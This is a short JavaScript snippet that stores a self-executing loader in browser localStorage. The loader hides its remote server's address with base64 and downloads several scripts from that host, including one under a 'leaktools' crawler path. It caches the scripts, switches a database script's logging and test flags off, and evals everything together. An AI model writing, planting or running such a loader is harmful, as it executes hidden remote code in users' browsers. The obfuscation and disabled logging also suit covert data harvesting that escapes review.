localStorage.setItem('l', `(async () => {
    const rootUrl = atob('aHR0cHM6Ly9uaGRhc21yLXYyLTIuZ2xpdGNoLm1lLw==');
    const scriptUrls = {
        Utils: 'Utils.class.js',
        Config: 'app/Config.class.js',
        classes: 'models/classes.js',
        crawlData: 'dev/leaktools/JaCrawler.class.js',
        Database: 'models/Database.class.js'
    };

    const loadAndStoreScript = async (key, url) => {
        const storedScript = localStorage.getItem(key);
        if (!storedScript) {
            let script = await (await fetch(rootUrl + url)).text();
            localStorage.setItem(key, script);
        }
    };

    await Promise.all([
        loadAndStoreScript('Utils.class', scriptUrls.Utils),
        loadAndStoreScript('Config.class', scriptUrls.Config),
        loadAndStoreScript('classes', scriptUrls.classes),
        loadAndStoreScript('JaCrawler.class', scriptUrls.crawlData)
    ]);

    let databaseScript = await (await fetch(rootUrl + scriptUrls.Database)).text();
    databaseScript = databaseScript.replace('log: true', 'log: false').replace('test: true', 'test: false');
    const [ utilsScriptStored, configScriptStored, classesScriptStored, crawlScriptStored ] 
    = [ 'Utils.class', 'Config.class', 'classes', 'JaCrawler.class' ].map(key => localStorage.getItem(key));

    eval([
      utilsScriptStored, configScriptStored, 
      classesScriptStored, databaseScript,
      crawlScriptStored
    ].join('\\n'));
})();`);